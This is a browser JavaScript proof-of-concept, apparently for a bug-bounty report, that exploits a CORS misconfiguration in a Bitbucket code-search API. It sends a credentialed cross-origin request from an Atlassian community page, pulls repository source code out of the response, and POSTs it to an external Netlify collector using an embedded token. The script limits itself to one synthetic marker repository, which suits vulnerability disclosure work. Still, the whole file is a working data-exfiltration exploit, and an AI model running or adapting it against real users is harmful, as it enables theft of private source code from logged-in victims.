// Owned-fixture Bitbucket DevAI CORS proof -> authenticated Netlify dashboard.
//
// Run only from: https://community.developer.atlassian.com
// Scope: one synthetic repository, one marker file, and one unique marker.
// The script refuses to forward any unrelated repository or file.

(async () => {
  "use strict";

  const CONFIG = Object.freeze({
    expectedOrigin: "https://community.developer.atlassian.com",
    searchEndpoint:
      "https://bitbucket.org/gateway/api/devai-code-search/v1/search",
    collectorEndpoint:
      "https://bb-code-search-dashboard-323.netlify.app/api/collect",
    collectorToken:
      "471fa898513d8cfc8598831d874b3a57c1ad622e3a3ecac82250ee2036f0f9cb",
    namespace: "croexp-cors-poc-2026",
    repository: "cors-proof-20261029111753",
    path: "cors-proof-marker.js",
    marker: "CORS_ZERO_ID_PROOF_20261029111753",
    maxResults: 10,
    maxChunks: 10,
    maxSourceChars: 8192,
    timeoutMs: 15000,
    attempts: 3,
  });

  const log = (message, detail) =>
    detail === undefined
      ? console.log(`[owned-dashboard-proof] ${message}`)
      : console.log(`[owned-dashboard-proof] ${message}`, detail);

  const delay = (milliseconds) =>
    new Promise((resolve) => setTimeout(resolve, milliseconds));

  function requestBody() {
    return {
      query: {
        search_term: CONFIG.marker,
        filters: {
          attribute: "namespace",
          eq: CONFIG.namespace,
        },
      },
      config: {
        max_results: CONFIG.maxResults,
        search_mode: "LEXICAL",
      },
    };
  }

  async function searchOnce() {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), CONFIG.timeoutMs);

    try {
      const response = await fetch(CONFIG.searchEndpoint, {
        method: "POST",
        mode: "cors",
        credentials: "include",
        cache: "no-store",
        redirect: "error",
        referrerPolicy: "strict-origin-when-cross-origin",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
          "x-rovodev-xid": "bitbucket",
        },
        body: JSON.stringify(requestBody()),
        signal: controller.signal,
      });

      let json;
      try {
        json = await response.json();
      } catch {
        throw new Error(
          `Bitbucket returned HTTP ${response.status} with non-JSON content.`,
        );
      }

      if (!response.ok) {
        const reason = json?.metadata?.empty_result_cause?.reason;
        const error = new Error(
          `Bitbucket returned HTTP ${response.status}${reason ? ` (${reason})` : ""}.`,
        );
        error.retryable = response.status === 429 || response.status >= 500;
        throw error;
      }

      return { response, json };
    } finally {
      clearTimeout(timeout);
    }
  }

  async function searchWithRetry() {
    let lastError;
    for (let attempt = 1; attempt <= CONFIG.attempts; attempt += 1) {
      try {
        return { ...(await searchOnce()), attempt };
      } catch (error) {
        lastError = error;
        const retryable =
          error?.name === "AbortError" ||
          error?.name === "TypeError" ||
          error?.retryable;
        if (!retryable || attempt === CONFIG.attempts) break;
        await delay(400 * 2 ** (attempt - 1));
      }
    }
    throw lastError;
  }

  function extractOwnedFixture(json) {
    if (!json || typeof json !== "object") {
      throw new Error("Bitbucket returned an invalid JSON object.");
    }

    const repositories = Array.isArray(json.repositories)
      ? json.repositories
      : [];
    const matchedFiles = Array.isArray(json.matched_files)
      ? json.matched_files
      : [];

    const repository = repositories.find(
      (item) =>
        item?.name === CONFIG.repository &&
        item?.ns === CONFIG.namespace &&
        typeof item?.id === "string",
    );

    if (!repository) {
      throw new Error("The exact owned synthetic repository was not returned.");
    }

    const ownedFiles = matchedFiles.filter(
      (file) =>
        file?.repositoryId === repository.id &&
        file?.path === CONFIG.path &&
        file?.name === CONFIG.path.split("/").pop(),
    );

    if (ownedFiles.length === 0) {
      throw new Error("The exact owned synthetic marker file was not returned.");
    }

    const chunksByKey = new Map();
    for (const file of ownedFiles) {
      for (const chunk of file.matched_chunks || []) {
        if (typeof chunk?.source_code !== "string") continue;
        const key = chunk.id || JSON.stringify(chunk.line_range || {});
        chunksByKey.set(key, chunk);
      }
    }

    const chunks = [...chunksByKey.values()].sort(
      (left, right) =>
        (left.line_range?.start || 0) - (right.line_range?.start || 0),
    );

    if (chunks.length === 0 || chunks.length > CONFIG.maxChunks) {
      throw new Error(`Unsafe source chunk count: ${chunks.length}.`);
    }

    const sourceCode = chunks.map((chunk) => chunk.source_code).join("\n");
    if (sourceCode.length > CONFIG.maxSourceChars) {
      throw new Error(`Unsafe source size: ${sourceCode.length} characters.`);
    }
    if (!sourceCode.includes(CONFIG.marker)) {
      throw new Error("The synthetic marker was not present in returned source.");
    }

    const startLine = Math.min(
      ...chunks.map((chunk) => chunk.line_range?.start || 1),
    );
    const endLine = Math.max(
      ...chunks.map(
        (chunk) =>
          chunk.line_range?.end ||
          (chunk.line_range?.start || 1) + chunk.source_code.split("\n").length - 1,
      ),
    );
    const coveredLines = new Set();
    for (const chunk of chunks) {
      const first = chunk.line_range?.start || 1;
      const count = chunk.source_code.split("\n").length;
      for (let offset = 0; offset < count; offset += 1) {
        coveredLines.add(first + offset);
      }
    }

    const extractedAt = new Date().toISOString();
    return {
      repository: {
        id: repository.id,
        name: repository.name,
        url: repository.url || null,
        namespace: repository.ns,
      },
      file: {
        id: `${repository.name}/${CONFIG.path}`,
        repoName: repository.name,
        repoId: repository.id,
        path: CONFIG.path,
        language: ownedFiles[0]?.language || "JavaScript",
        totalLines: endLine,
        coveredLines: coveredLines.size,
        coverage: Number(((coveredLines.size / endLine) * 100).toFixed(1)),
        gaps: startLine > 1 ? [[1, startLine - 1]] : [],
        sourceCode,
        extractedAt,
      },
      chunks: chunks.length,
      ignoredRepositories: Math.max(0, repositories.length - 1),
      ignoredFiles: Math.max(0, matchedFiles.length - ownedFiles.length),
      extractedAt,
    };
  }

  async function sendToDashboard(owned, searchResult, attemptsUsed) {
    const payload = {
      repositories: [owned.repository],
      matched_files: [owned.file],
      metadata: {
        method: "owned-synthetic-marker-only",
        workspace: CONFIG.namespace,
        marker: CONFIG.marker,
        markerFound: true,
        requestId: searchResult.id || null,
        attemptsUsed,
        readableChunks: owned.chunks,
        ignoredRepositories: owned.ignoredRepositories,
        ignoredFiles: owned.ignoredFiles,
        extractedAt: owned.extractedAt,
        boundary: "Exact owned synthetic repository, file, and marker only.",
      },
    };

    const response = await fetch(CONFIG.collectorEndpoint, {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: {
        "content-type": "application/json",
        "x-poc-token": CONFIG.collectorToken,
      },
      body: JSON.stringify(payload),
    });

    const text = await response.text();
    if (!response.ok) {
      throw new Error(`Collector returned HTTP ${response.status}: ${text}`);
    }

    let receipt = null;
    try {
      receipt = JSON.parse(text);
    } catch {
      receipt = { raw: text };
    }
    return { payload, receipt };
  }

  if (location.origin !== CONFIG.expectedOrigin) {
    throw new Error(
      `Refusing to run from ${location.origin}; expected ${CONFIG.expectedOrigin}.`,
    );
  }

  log("Starting exact owned-fixture search.");
  const { response, json, attempt } = await searchWithRetry();
  const owned = extractOwnedFixture(json);
  log("Owned synthetic marker confirmed; sending only that fixture.");
  const dashboard = await sendToDashboard(owned, json, attempt);

  const result = {
    ok: true,
    origin: location.origin,
    bitbucketStatus: response.status,
    requestId: json.id || null,
    repository: owned.repository.name,
    file: owned.file.path,
    marker: CONFIG.marker,
    sourceCharacters: owned.file.sourceCode.length,
    dashboardReceipt: dashboard.receipt,
    completedAt: new Date().toISOString(),
  };

  window.__BB_OWNED_DASHBOARD_PROOF__ = result;
  log("Complete. Result saved to window.__BB_OWNED_DASHBOARD_PROOF__", result);
  return result;
})();
